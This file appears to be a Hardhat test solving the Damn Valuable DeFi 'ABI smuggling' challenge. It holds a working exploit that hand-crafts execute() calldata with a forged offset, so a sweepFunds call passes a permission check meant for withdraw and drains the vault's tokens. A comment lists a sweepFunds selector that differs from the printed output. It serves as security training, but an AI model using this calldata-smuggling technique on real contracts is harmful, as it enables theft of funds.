const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it ('Playground', async function() {
        /** CODE YOUR SOLUTION HERE
         * 0) Pensar en burlar el keccak splitteando de maneras distintas que
         * como resultado den el mismo al usar el packed encoding, pero msg.sender en el medio lo hace imposible.
         * 1) Parto de que el único que podría triggerear algún comportamiento, que es usando player según la consigna.
         * ```const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);```
         *  # Busco las funcSigs
         *  Sighash   |   Function Signature
         *  ========================
         *  d9caed12  =>  withdraw(address,address,uint256)
         *  97c540ba  =>  sweepFunds(address,IERC20)
         *  266df782  =>  getLastWithdrawalTimestamp()
         *  0b73a8d0  =>  _beforeFunctionCall(address,bytes)
         * hay alguna manera de que actionData, esté crafteada usando sweep, con el addres del player y del token, y que a su vez,
         * me permita ingresar como permitido siendo msg.sender?
         * 
         * cómo puedo hacer para que el selector que aparece en 4 + 32*3 me de withdraw, pero que actionData comience con sweep?
         * puedo hacer mi call con mi propio calldata?
         * que actiondata tenga x contenido, pero que el calldata sea manipulado
         * es decir el payload sería algo así
         * 4 bytes de fs(execute) + 32 bytes de target + 32 bytes inicio de actionData + 32 bytes de length de actionData + 4 bytes de function selector withdraw para bypass
         * pero qué pasa si le decimos que en realidad arranca 32 bytes más adelante?
         * 4 bytes [fs(execute)] + 32 bytes [address(target)] + 32 bytes [00..0000084] + 32 bytes [len(sweep y blah] + 32 bytes [00...fs(withraw)] + xxx bytes de sweep+ blah
         * el principal error está en calcular la posición de comienzo de actionData de manera manual sin leer los valores necesarios
         * como la posición real, y el tamaño
        */

        // To get our setup started, we're gonna code an accepted use case, with player callindg withdraw.
        // First, let's connect the vault to player
        vault = await vault.connect(player);

        // Then, let's fast forward to the future! Around 15 days, so we can call withdraw.
        // We have to do this, because this has just been deployed initializing _lastWithdrawalTimestamp with block.timestamp.
        ethers.provider.send("evm_increaseTime", [60 * 60 * 24 * 15]) // 60 seconds * 60 minutes * 24 hours * 15 days

        // Now, we have to craft actionData! And for that, we can use encodeFunctionData
        // ```interface.encodeFunctionData( fragment [ , values ] ) ⇒ string< DataHexString >``` 
        actionData = await vault.interface.encodeFunctionData('withdraw', [token.address, player.address, 10n ** 18n]);
        // console.log(actionData);

        // If we were to decode this data, to understand what's happening below, we could use it's antagonist decodeFunctionData
        decodedData = await vault.interface.decodeFunctionData("withdraw", actionData);
        // console.log(decodedData);
        
        /*      
        token: '0x5FbDB2315678afecb367f032d93F642f64180aa3',
        recipient: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
        amount: BigNumber { value: "1000000000000000000" }

        [0] 0xd9caed12 -> withdraw function selector
        [1] 0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3 -> token address
        [2] 00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8 -> player address
        [3] 0000000000000000000000000000000000000000000000000de0b6b3a7640000 -> 1 eth representation
        */
        
        // And finally, we execute this successfully.
        await vault.execute(vault.address, actionData);

        // We will evuentually need to manually craft the calldata for execute. We need to tamper some things!
        // But first, let's see how is it normally composed.
        executeData = await vault.interface.encodeFunctionData("execute", [vault.address, actionData])
        // console.log(executeData);
        
        /* I'm commenting out the console.log, but the analyisis of the raw output is below.
        [0] 0x1cff79cd -> execute function selector (it gets removed from the actual data)
        [1] [000 - 032 bytes] 000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512 -> vault address
        [2] actionData start position
            [032 - 064 bytes] 0000000000000000000000000000000000000000000000000000000000000040 -> offset to start structure (it starts immediately after this word)
        [3] actionData start:
           [064 - 096 bytes] 0000000000000000000000000000000000000000000000000000000000000064 -> bytes length / number of elements
        [4] actionData content:
            [0][096 - 100] d9caed12 -> withdraw function selector
            [1][100 - 132] 0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3 -> token address
            [2][132 - 164] 00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8 -> player address
            [3][164 - 196] 0000000000000000000000000000000000000000000000000de0b6b3a7640000 -> 1 ether repr.
            [4] 00000000000000000000000000000000000000000000000000000000 -> 28 bytes padding
        */
        
        // Let's try if this method works properly. Let's send this raw transaction, fast forwarding 15 days into the future.
        await ethers.provider.send("evm_increaseTime", [60 * 60 * 24 * 16]) // 60 seconds * 60 minutes * 24 hours * 15 days
        await ethers.provider.send("evm_mine"); // mining just in case

        await player.sendTransaction({to: vault.address, data: executeData});

        // Let's return what we've gathered, in order to start from scratch in the following test.
        await token.connect(player).transfer(vault.address, 2n * 10n ** 18n);


    })

    it('Exploit', async function () {
        // Since the previous test worked, we are ready to craft our exploit.

        /** Now, let's try to smuggle the sweepFunds call behind it!
         * What do we know so far? That we need to call sweepFunds in a certain point of time.
         * So we will eventually need to craft what would the calldata to a proper sweepFunds would look like.
         * sweepFunds(address receiver, IERC20 token)
         * 
         * Our restriction is having a function selector that we are allowed to execute, in the position that
         * is being read manually. So the function selector of withdraw will have to be fixed, and then we
         * work around that.
        
        [0] 0x1cff79cd -> execute function selector (it gets removed from the actual data)
        [1][000 - 032 bytes] 000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512 -> vault address
        [2] exploit start position
            [032 - 064 bytes] 0000000000000000000000000000000000000000000000000000000000000064 -> offset to start structure
        [3][064 - 096 bytes] 0000000000000000000000000000000000000000000000000000000000000000 -> nops / fill-up
        [4][096 - 100] d9caed12 -> withdraw function selector -- this is mandatory
        [5] exploit start content:
            [0] [100 - 132] 0000000000000000000000000000000000000000000000000000000000000044 -> bytes length / number of elements
            [1] [132 - 136] 97c540ba -> sweepfunds function selector
            [2] [136 - 168] 0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC -> recovery address
            [3] [168 - 200] 0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3 -> token address
            [4] [200 - 224] 00000000000000000000000000000000000000000000000000000000 -> 24 bytes padding
        */

        /** Our final composition should look like something like this:
         * actionData = exploitOffset + nops + withdrawFs + exploitSize + exploit + padding
         * calldata = executeFs + vaultAddr + actionData
         **/

        fragment = await vault.interface.getFunction("execute");
        executeFs = await vault.interface.getSighash(fragment); 
        
        vaultAddr = await ethers.utils.hexZeroPad(vault.address, 32);
        
        fragment = await vault.interface.getFunction("withdraw");
        withdrawFs = await vault.interface.getSighash(fragment);
        
        nops = await ethers.utils.hexZeroPad("0x0", 32);

        exploitOffset = await ethers.utils.hexZeroPad("0x64", 32);
        exploitSize = await ethers.utils.hexZeroPad("0x44", 32);

        /* What we are smuggling, the real mvp!
         * The receiver is going to be the recovery address, and we're going to save this output to a variable called
         * payload, because this won't be actionData, just a part of it, the payload inside it! */
        exploit = await vault.interface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);

        padding = await ethers.utils.hexZeroPad("0x0", 24);

        actionData = await ethers.utils.hexConcat([exploitOffset, nops, withdrawFs, exploitSize, exploit, padding])
        calldata = await ethers.utils.hexConcat([executeFs, vaultAddr, actionData])
        
        await player.sendTransaction({ to: vault.address, data: calldata })

        // Here's the current output, where you can check that it is equal to what we wanted it to be
        // console.log(calldata);
        /* 
        0x
        1cff79cd
        000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
        0000000000000000000000000000000000000000000000000000000000000064
        0000000000000000000000000000000000000000000000000000000000000000
        d9caed12
        0000000000000000000000000000000000000000000000000000000000000044
        85fb709d
        0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc
        000000000000000000000000000000000000000000000000
        */
        

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
